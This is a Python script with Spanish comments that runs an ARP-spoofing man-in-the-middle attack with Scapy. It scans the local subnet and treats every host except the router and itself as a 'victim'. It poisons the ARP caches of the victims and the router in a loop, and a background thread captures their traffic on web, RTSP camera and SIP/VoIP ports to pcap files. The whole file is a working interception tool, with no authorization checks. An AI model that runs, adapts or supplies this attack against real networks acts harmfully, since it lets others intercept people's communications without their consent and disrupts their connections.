from scapy.all import ARP, Ether, srp, send, conf, wrpcap, PcapWriter, IP, TCP, UDP, sniff
import time
import socket
import sys
import re
import platform
import os
import datetime
import threading

# Configuración
# Detectar Sistema Operativo
def detectar_so():
    """Detecta el sistema operativo y muestra instrucciones específicas si es necesario"""
    sistema = platform.system()
    print(f"🖥️  Sistema operativo detectado: {sistema}")
    
    # Verificar si el usuario tiene permisos de administrador
    es_admin = False
    if sistema == "Windows":
        import ctypes
        es_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    else:
        es_admin = os.geteuid() == 0 if hasattr(os, "geteuid") else False
    
    # Mostrar advertencias según el sistema operativo
    if sistema == "Windows" and not es_admin:
        print("⚠️  En Windows se requieren permisos de administrador.")
        print("    Por favor, ejecuta este script como Administrador.")
    elif (sistema == "Linux" or sistema == "Darwin") and not es_admin:
        print("⚠️  Se requieren permisos de root para el spoofing ARP.")
        print("    Por favor, ejecuta el script con 'sudo'.")

# Detectar el SO al inicio
detectar_so()

# Configuración de la interfaz de red
try:
    # conf.iface funciona en la mayoría de casos con Scapy
    interfaz = conf.iface
    print(f"🌐 Interfaz detectada automáticamente: {interfaz}")
    
    # Configurar explícitamente la interfaz para evitar advertencias
    conf.verb = 0  # Desactivar mensajes verbosos
    
    # Obtener detalles de la interfaz para verificar que es funcional
    if hasattr(conf, 'get_if_hwaddr'):
        try:
            mac_local = conf.get_if_hwaddr(interfaz)
            print(f"📱 MAC local: {mac_local}")
        except:
            print("⚠️ No se pudo determinar la dirección MAC local")
except Exception as e:
    print(f"⚠️ No se pudo detectar interfaz automáticamente: {e}")
    interfaz = None

intervalo = 2  # segundos entre paquetes

# Comprobar argumentos para permitir una red específica
red_personalizada = None
if len(sys.argv) > 1:
    if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}$", sys.argv[1]):
        red_personalizada = sys.argv[1]
        print(f"🎯 Red personalizada especificada: {red_personalizada}")
    else:
        print("❌ Formato de red incorrecto. Utilice: 192.168.1.0/24")
        sys.exit(1)

# Obtener IP local
def get_local_ip():
    """
    Obtener la IP real de la interfaz conectada a la red, no localhost.
    Compatible con Windows, Linux y macOS.
    """
    # Método 1: Mediante conexión "falsa" a DNS de Google (funciona en la mayoría de OS)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        pass
    
    # Método 2: Para Windows/Linux (alternativo)
    try:
        host_name = socket.gethostname()
        # Obtener todas las direcciones IP disponibles
        ips = socket.getaddrinfo(host_name, None)
        # Filtrar para obtener sólo direcciones IPv4 no-localhost
        for item in ips:
            addr = item[4][0]
            if not addr.startswith('192.') and '.' in addr:
                return addr
    except Exception:
        pass
    
    # Método 3: Último recurso (menos fiable)
    try:
        return socket.gethostbyname(socket.gethostname())
    except Exception as e:
        print(f"❌ No se pudo detectar una IP válida: {e}")
        print("⚠️ Usando 192.168.1.8 como fallback. El escaneo probablemente fallará.")
        return "192.168.1.8"

# Obtener red
def get_network_range(ip):
    """Determina el rango de red basado en la IP local"""
    # Verificar si la IP es válida y no es localhost
    if ip.startswith("192."):
        print("⚠️ IP detectada es localhost (192.x.x.x). Esto no escaneará tu red real.")
        print("❗ Asegúrate de estar conectado a una red.")
    
    base = '.'.join(ip.split('.')[:3])
    return f"{base}.0/24"  # Usar x.x.x.0/24 que cubre toda la subred

# Escanear red
def escanear_dispositivos(rango):
    print(f"🔍 Escaneando red: {rango}...")
    paquete = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=rango)
    # Aumentar el timeout para dar más tiempo a que respondan los dispositivos
    result = srp(paquete, timeout=3, verbose=0)[0]
    dispositivos = [{'ip': r.psrc, 'mac': r.hwsrc} for _, r in result]
    print(f"📡 Encontrados {len(dispositivos)} dispositivos en la red.")
    return dispositivos

# Obtener dirección MAC
def get_mac(ip):
    """Obtiene la dirección MAC de una IP. Funciona en cualquier OS."""
    try:
        # Escaneamos la dirección MAC con ARP
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
        if ans:
            return ans[0][1].hwsrc
    except Exception:
        pass
    return None

# ARP Spoof
def spoof(victim_ip, spoof_ip):
    """
    Enviar paquete ARP falso.
    Esta implementación funciona en todos los OS y evita advertencias.
    """
    try:
        # Primero intentamos obtener la MAC real de la víctima
        victim_mac = get_mac(victim_ip)
        
        if victim_mac:
            # IMPORTANTE: Crear un paquete completo Ether/ARP para evitar advertencias
            # Esto indica explícitamente la dirección MAC de destino en la capa Ethernet
            ether = Ether(dst=victim_mac)
            arp = ARP(op=2, pdst=victim_ip, psrc=spoof_ip, hwdst=victim_mac)
            pkt = ether/arp
            send(pkt, verbose=0)
        else:
            # Si no encontramos la MAC, intentamos con un broadcast como último recurso
            print(f"⚠️ No se pudo obtener la MAC de {victim_ip}, usando broadcast")
            # Aún así construimos el paquete completo con Ethernet
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp = ARP(op=2, pdst=victim_ip, psrc=spoof_ip, hwdst="ff:ff:ff:ff:ff:ff")
            pkt = ether/arp
            send(pkt, verbose=0)
    except Exception as e:
        # Solo registramos errores reales, no advertencias
        print(f"Error en spoofing de {victim_ip}: {e}")
        pass

# Restaurar tabla ARP
def restore(victim_ip, victim_mac, router_ip, router_mac):
    """
    Restaura las tablas ARP a su estado original.
    Compatible con todos los OS y evita advertencias.
    """
    try:
        # IMPORTANTE: Crear un paquete completo Ether/ARP para evitar advertencias
        # El destino Ethernet debe coincidir con la dirección MAC de la víctima
        ether = Ether(dst=victim_mac)
        arp = ARP(
            op=2,               # is-at (respuesta ARP)
            pdst=victim_ip,     # IP de la víctima
            hwdst=victim_mac,   # MAC de la víctima
            psrc=router_ip,     # Fingimos ser el router
            hwsrc=router_mac    # Con la MAC legítima del router
        )
        pkt = ether/arp
        
        # Enviamos múltiples paquetes para asegurar que la restauración funciona
        send(pkt, count=5, verbose=0)
    except Exception as e:
        print(f"⚠️ Error al restaurar ARP para {victim_ip}: {e}")
        # Intentar método alternativo si el primero falla
        try:
            # Método alternativo con paquete más simple
            ether = Ether(dst=victim_mac)
            arp = ARP(op=2, pdst=victim_ip, psrc=router_ip, hwsrc=router_mac)
            send(ether/arp, count=5, verbose=0)
        except Exception as e2:
            print(f"   Error en método alternativo: {e2}")

# Principal
try:
    # Obtener nuestra IP local
    ip_local = get_local_ip()
    print(f"📌 IP local detectada: {ip_local}")
    
    # Determinar el rango de red (usar la red personalizada si está especificada)
    if red_personalizada:
        red = red_personalizada
    else:
        red = get_network_range(ip_local)
    
    # Iniciar escaneo
    dispositivos = escanear_dispositivos(red)
    
    # Verificar si se encontraron dispositivos
    if not dispositivos:
        print("❌ No se encontraron dispositivos en la red. Verifique su conexión.")
        exit(1)
    
    # Intentar identificar el router (gateway)
    # Normalmente el gateway tiene la dirección IP que termina en .1
    gateway_ip = '.'.join(ip_local.split('.')[:3]) + '.1'
    router = None
    for dispositivo in dispositivos:
        if dispositivo['ip'] == gateway_ip:
            router = dispositivo
            break
    
    # Si no encontramos el router con ese método, tomamos el primero
    if router is None and dispositivos:
        router = dispositivos[0]
        print("⚠️ No se pudo identificar el gateway con precisión, usando el primer dispositivo encontrado.")
    
    if router:
               gateway_ip = '.'.join(ip_local.split('.')[:3]) + '.1'
    else:
        print("❌ No se pudo identificar ningún router. Saliendo...")
        exit(1)

    # Filtrar víctimas (no vos ni router)
    victimas = [d for d in dispositivos if d['ip'] != ip_local and d['ip'] != router['ip']]

    if not victimas:
        print("⚠️ No se encontraron víctimas potenciales en la red.")
        exit(1)

    # Mostrar información sobre las víctimas y cache la MAC para eliminar advertencias futuras
    print(f"🎯 Atacando víctimas:")
    mac_cache = {}  # Guardar las MACs para no tener que consultar repetidamente
    
    for v in victimas:
        print(f" → {v['ip']} ({v['mac']})")
        mac_cache[v['ip']] = v['mac']
    
    # También guardamos la MAC del router
    mac_cache[router['ip']] = router['mac']
    
    print("\n[*] Iniciando ataque ARP. Presiona CTRL+C para detener.")
    print("    Las conexiones de las víctimas pueden interrumpirse brevemente.")
    contador = 0
    
    # Configuramos conf.L3socket para evitar problemas de compatibilidad en algunos sistemas
    if hasattr(conf, 'L3socket'):
        originaL3socket = conf.L3socket
    
    # Crear carpeta para almacenar capturas
    logs_dir = "capturas_arp"
    if not os.path.exists(logs_dir):
        os.makedirs(logs_dir)
    
    # Archivo para guardar los paquetes ARP
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    pcap_file = os.path.join(logs_dir, f"ataque_arp_{timestamp}.pcap")
    print(f"📊 Los paquetes ARP se guardarán en: {pcap_file}")
    
    # Archivo para guardar el tráfico de servicios específicos
    services_pcap_file = os.path.join(logs_dir, f"servicios_{timestamp}.pcap")
    print(f"📊 El tráfico de servicios específicos se guardará en: {services_pcap_file}")
    
    # Inicializar los escritores de PCAP
    pcap_writer = PcapWriter(pcap_file, append=True, sync=True)
    services_pcap_writer = PcapWriter(services_pcap_file, append=True, sync=True)
    
    # Crear archivo de log para registrar detalles de los paquetes
    log_file = os.path.join(logs_dir, f"log_arp_{timestamp}.txt")
    print(f"📝 Detalles del ataque se registrarán en: {log_file}")
    
    # Puertos de servicios a capturar
    PUERTOS_SERVICIOS = {
        'TCP': [80, 443, 554, 8080, 5060, 5061, 8081, 8888],
        'UDP': [554, 5060, 5061, 5004]
    }
    
    # Función para filtrar paquetes basado en puertos
    def filtro_servicios(pkt):
        if IP in pkt:
            if TCP in pkt and (pkt[TCP].sport in PUERTOS_SERVICIOS['TCP'] or pkt[TCP].dport in PUERTOS_SERVICIOS['TCP']):
                return True
            elif UDP in pkt and (pkt[UDP].sport in PUERTOS_SERVICIOS['UDP'] or pkt[UDP].dport in PUERTOS_SERVICIOS['UDP']):
                return True
        return False
    
    # Función para capturar tráfico de servicios específicos
    def capturar_servicios():
        print("🔍 Iniciando captura de tráfico en puertos específicos...")
        
        with open(log_file, "a") as f:
            f.write(f"[{datetime.datetime.now()}] Iniciando captura de tráfico en puertos específicos:\n")
            f.write("TCP: " + ", ".join(map(str, PUERTOS_SERVICIOS['TCP'])) + "\n")
            f.write("UDP: " + ", ".join(map(str, PUERTOS_SERVICIOS['UDP'])) + "\n\n")
        
        try:
            # Capturar paquetes y guardarlos
            sniff(filter="tcp or udp", lfilter=filtro_servicios, 
                  prn=lambda x: services_pcap_writer.write(x),
                  store=False)
        except Exception as e:
            print(f"Error en captura de servicios: {e}")
            with open(log_file, "a") as f:
                f.write(f"[{datetime.datetime.now()}] Error en captura: {e}\n")
    
    # Iniciar captura de servicios en un hilo separado
    sniff_thread = threading.Thread(target=capturar_servicios)
    sniff_thread.daemon = True  # El hilo terminará cuando termine el programa principal
    sniff_thread.start()
    
    # Modificar la función spoof para aceptar MACs directamente, guardar paquetes y registrar logs
    def spoof_with_mac(target_ip, spoof_ip, target_mac):
        """Versión optimizada de spoof que usa MAC ya conocidas, guarda paquetes y registra logs"""
        try:
            # Registrar información antes del spoofing para verificar parámetros
            log_entry = f"[{datetime.datetime.now().strftime('%H:%M:%S.%f')}] "
            log_entry += f"SPOOF: target_ip={target_ip}, target_mac={target_mac}, spoof_ip={spoof_ip}\n"
            
            with open(log_file, "a") as f:
                f.write(log_entry)
                
            # Validar que la MAC no esté vacía
            if not target_mac:
                error_msg = f"⚠️ ERROR: MAC vacía para IP {target_ip}"
                print(error_msg)
                with open(log_file, "a") as f:
                    f.write(f"{error_msg}\n")
                return False
                
            # Creamos directamente el paquete con la MAC que ya conocemos
            ether = Ether(dst=target_mac)
            arp = ARP(
                op=2,               # is-at (respuesta ARP)
                pdst=target_ip,     # IP destino
                hwdst=target_mac,   # MAC destino
                psrc=spoof_ip       # IP que falsificamos
            )
            pkt = ether/arp
            
            # Guardar el paquete en el archivo PCAP
            pcap_writer.write(pkt)
            
            # Enviar el paquete
            send(pkt, verbose=0)
            return True
        except Exception as e:
            error_msg = f"Error en spoofing directo de {target_ip}: {e}"
            print(error_msg)
            with open(log_file, "a") as f:
                f.write(f"{error_msg}\n")
            return False
            
    while True:
        # Alternamos entre víctimas para distribuir el tráfico
        for v in victimas:
            # Usar las MAC cacheadas directamente
            v_mac = mac_cache[v['ip']]
            r_mac = mac_cache[router['ip']]
            
            # A la víctima le decimos "yo soy el router" (usando MAC ya conocida)
            spoof_with_mac(v['ip'], router['ip'], v_mac)
            
            # Al router le decimos "yo soy la víctima" (usando MAC ya conocida)
            spoof_with_mac(router['ip'], v['ip'], r_mac)
        
        # Mostrar indicador de actividad cada 10 ciclos
        contador += 1
        if contador % 10 == 0:
            print(f"💫 ARP spoofing activo... ({contador} ciclos)", end="\r", flush=True)
            
        # Pausa entre ciclos
        time.sleep(intervalo)

except KeyboardInterrupt:
    print("\n\n[!] Deteniendo ataque y restaurando red...")
    try:
        if 'victimas' in locals() and 'router' in locals() and victimas and router and 'mac_cache' in locals():
            print("[*] Enviando paquetes ARP de restauración...")
            
            # Función para restaurar y guardar en PCAP
            def restore_and_save(victim_ip, victim_mac, router_ip, router_mac):
                # Construir el paquete de restauración
                ether = Ether(dst=victim_mac)
                arp = ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                        psrc=router_ip, hwsrc=router_mac)
                pkt = ether/arp
                
                # Guardar el paquete de restauración en el archivo PCAP
                if 'pcap_writer' in locals():
                    pcap_writer.write(pkt)
                
                # Enviar el paquete de restauración
                send(pkt, count=5, verbose=0)
            
            # Usar las MACs cacheadas para la restauración
            for _ in range(3):  # Intentar 3 rondas de restauración
                for v in victimas:
                    victim_mac = mac_cache.get(v['ip'], v['mac'])
                    router_mac = mac_cache.get(router['ip'], router['mac'])
                    
                    # Restaurar tablas ARP y guardar paquetes
                    restore_and_save(v['ip'], victim_mac, router['ip'], router_mac)
                    restore_and_save(router['ip'], router_mac, v['ip'], victim_mac)
                    
                time.sleep(0.5)  # Pausa entre rondas
            
            # Cerrar el archivo PCAP si existe
            if 'pcap_writer' in locals():
                pcap_writer.close()
                print(f"📊 Archivo de captura guardado: {pcap_file}")
                
            print("[+] Listo. Tablas ARP restauradas.")
            print("    Nota: Algunos dispositivos pueden tardar en restablecer conexiones.")
        else:
            print("[+] No hay cambios que restaurar.")
    except Exception as e:
        print(f"[!] Error al restaurar la red: {e}")
        print("    Es posible que tengas que reiniciar el router o los dispositivos afectados.")
except PermissionError:
    print("\n[!] Error de permisos.")
    if platform.system() == "Windows":
        print("    En Windows, debes ejecutar este script como Administrador.")
    else:
        print("    En Linux/macOS, debes ejecutar este script con 'sudo'.")
except Exception as e:
    print(f"\n[!] Error inesperado: {e}")
    print("    Intenta verificar tu conexión de red o tus permisos de administrador.")